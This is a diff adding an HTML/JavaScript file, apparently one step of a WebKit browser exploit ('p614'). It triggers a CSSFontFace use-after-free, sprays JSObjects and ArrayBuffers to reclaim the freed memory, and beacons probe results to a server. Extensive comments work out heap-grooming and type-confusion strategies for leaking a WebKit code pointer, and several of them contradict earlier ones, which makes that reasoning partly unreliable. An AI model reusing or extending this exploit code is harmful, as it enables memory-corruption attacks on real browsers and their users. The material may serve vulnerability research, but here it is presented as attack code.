@@ -1,0 +1,221 @@
+<!--
+  p614: StructureID leak via CSSFontFace UAF type confusion.
+
+  Strategy: Free CSSFontFace (192B), spray with JSObjects that are
+  exactly 192B (objects with ~16 inline properties push to 192B bucket).
+  Read the JSCell header (StructureID at +0) through our reclaimed AB.
+  Then use the StructureID to find the Structure table base → WebKit text.
+
+  JSCell layout (64-bit):
+    +0x00: StructureID (32-bit)
+    +0x04: IndexingType (8-bit)
+    +0x05: JSType (8-bit)
+    +0x06: InlineTypeFlags (8-bit)
+    +0x07: CellState (8-bit)
+    +0x08: butterfly pointer (64-bit) - points to property storage
+
+  JSObject with N inline properties: 16 + 8 + 8*N bytes
+  For 192B: N = (192-24)/8 = 21 properties. But size classes may differ.
+  Let's try several property counts and see what reclaims.
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p614</title>
+<style id="v1">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P614-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+
+var stage=0;
+var lane1=null, hit1=-1;
+var font_a=null;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(stage===0){stage=1;
+    font_a=this;
+    document.getElementById('v1').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('FREE');
+
+    // Instead of AB spray, spray with JSObjects of various sizes
+    // to try to reclaim the 192B CSSFontFace slot
+
+    // First, figure out what size class 192B falls into
+    // bmalloc size classes near 192: 160, 192, 224, 256
+    // So we need objects exactly in the 192B bucket
+
+    // JSObject: header(16) + butterfly(8) + inline_slots * 8
+    // 192 = 24 + N*8 → N=21 inline slots
+    // But objects don't always have that many inline slots
+    // With 13 own properties: overhead varies by engine
+
+    // Let's try multiple sizes
+    lane1=[];
+
+    // Strategy A: Create objects with specific property counts
+    // to hit the 192-byte size class
+    for(var i=0;i<4096;i++){
+      var obj={};
+      // 21 properties = should be ~192B internal
+      obj.a0=i; obj.a1=i; obj.a2=i; obj.a3=i;
+      obj.a4=i; obj.a5=i; obj.a6=i; obj.a7=i;
+      obj.a8=i; obj.a9=i; obj.aA=i; obj.aB=i;
+      obj.aC=i; obj.aD=i; obj.aE=i; obj.aF=i;
+      obj.aG=i; obj.aH=i; obj.aI=i; obj.aJ=i;
+      obj.aK=i;
+      lane1.push(obj);
+    }
+    b('OBJ-SPRAY:'+lane1.length);
+
+    // Also spray some ABs as a fallback check
+    var abs=[];
+    for(var i=0;i<1024;i++) abs.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<abs.length;j++){
+      var v=abs[j]; wD(v,0,0xDEAD); wD(v,4,0xBEEF);
+    }
+    b('AB-SPRAY:'+abs.length);
+
+    return;
+  }
+  return;
+},set:function(){}});
+
+function main(){
+b('BOOT');
+
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+// After spray, allocate ABs to READ the reclaimed data
+// The trick: if a JSObject landed in the freed CSSFontFace slot,
+// we won't see it through our AB. We need the AB to reclaim it.
+//
+// Actually, we have the WRONG approach. The flow should be:
+// 1. Free CSSFontFace → creates a 192B hole
+// 2. Spray ABs to reclaim → one AB now overlaps the hole
+// 3. Allocate JSObjects → they WON'T land in the AB (AB already took the hole)
+//
+// The RIGHT approach for type confusion:
+// 1. Free CSSFontFace → 192B hole
+// 2. Spray JSObjects → one JSObject reclaims the 192B hole
+// 3. Now we need a way to READ the reclaimed JSObject's raw memory
+//    But we DON'T have an AB overlapping it...
+//
+// CORRECT approach: TWO UAFs.
+// Step 1: FontFace A UAF → spray AB(192) → one AB reclaims → we can read it
+// Step 2: FontFace B UAF → spray JSObjects(192) → one JSObject reclaims
+//         the SECOND CSSFontFace slot → BUT we still can't read it
+//
+// ACTUALLY: The right way is:
+// Step 1: Create many AB(192)
+// Step 2: Free CSSFontFace → 192B hole appears
+// Step 3: The hole might be adjacent to one of our ABs
+// Step 4: Create a JSObject → it lands in the freed slot
+// Step 5: If we can cause an OOB on our adjacent AB, we can read the JSObject
+//
+// But we DON'T have OOB on ABs (they're bounds-checked).
+//
+// The real technique for non-IsoHeap:
+// Use the UAF to read the FREED CSSFontFace's fields (we already do: T1, T2).
+// These are heap pointers. Use them to understand heap layout.
+// Then use the SECOND UAF: instead of spraying AB, spray with a C++
+// object that HAS a vtable and IS 192 bytes.
+// Then read its vtable through the AB from phase 1.
+//
+// Wait - that's backwards too. We need ONE slot to have BOTH an AB
+// (for reading) AND a typed object (for vtable). That's impossible for
+// the SAME slot. Unless we:
+// 1. AB reclaims slot
+// 2. Free the AB's backing store
+// 3. JSObject reclaims the freed backing store
+// 4. Read through the AB → reads JSObject data
+//
+// But freeing an AB's backing store while keeping the view alive = another UAF.
+// On modern WebKit, transferring an AB detaches it.
+//
+// SIMPLEST WORKING APPROACH:
+// We already have AB reclaim. We can write arbitrary values.
+// What we need is an INFO LEAK of a WebKit text pointer.
+//
+// Approach: create a fake JSCell in our AB, then use JSC type confusion
+// to leak a pointer. Write a valid StructureID into the AB at +0x00,
+// set up the object to look like a valid JSObject, then pass it to
+// a function that reads object properties — the property values come
+// from offsets we control.
+
+// Actually... step back even further.
+// We have: controlled 192B chunk at a KNOWN heap address (T1/T2 from p611).
+// We have: no code pointer.
+// We need: WebKit .text base.
+//
+// Can we leak it through document.fonts timing? No.
+// Can we leak it through Error.stack? Let's try.
+
+setTimeout(function(){
+  b('PHASE-A');
+
+  // Try to get code pointers from Error.stack or Function.toString
+  try{
+    var e=new Error('test');
+    var stack=e.stack;
+    b('STACK:'+stack.substring(0,500));
+  }catch(e){b('STACK:ERR');}
+
+  // Function source
+  try{
+    var src=main.toString().substring(0,200);
+    b('FUNC-SRC:'+src.substring(0,100));
+  }catch(e){b('FUNC-SRC:ERR');}
+
+  // Check for WebAssembly
+  b('WASM:'+(typeof WebAssembly));
+
+  // Check for SharedArrayBuffer
+  b('SAB:'+(typeof SharedArrayBuffer));
+
+  // performance.now resolution
+  try{
+    var t1=performance.now();
+    var t2=performance.now();
+    b('PERF:delta='+(t2-t1));
+  }catch(e){b('PERF:ERR');}
+
+  // Try to get module addresses from Error objects
+  try{
+    function deepCall(n){
+      if(n<=0) throw new Error('deep');
+      return deepCall(n-1);
+    }
+    try{deepCall(10);}catch(e){
+      b('DEEP-STACK:'+e.stack.substring(0,500));
+    }
+  }catch(e){b('DEEP:ERR');}
+
+  // CSS.supports
+  try{
+    b('CSS-SUP:'+CSS.supports('font-family','test'));
+  }catch(e){b('CSS-SUP:ERR');}
+
+  // navigator info
+  b('UA:'+navigator.userAgent.substring(0,200));
+
+  // Check process memory layout via performance
+  try{
+    if(performance.memory){
+      b('MEM:'+JSON.stringify(performance.memory));
+    }else{
+      b('MEM:undefined');
+    }
+  }catch(e){b('MEM:ERR');}
+
+  b('DONE');
+}, 500);
+}
+
+setTimeout(main,0);
+</script></head><body>p614</body></html>
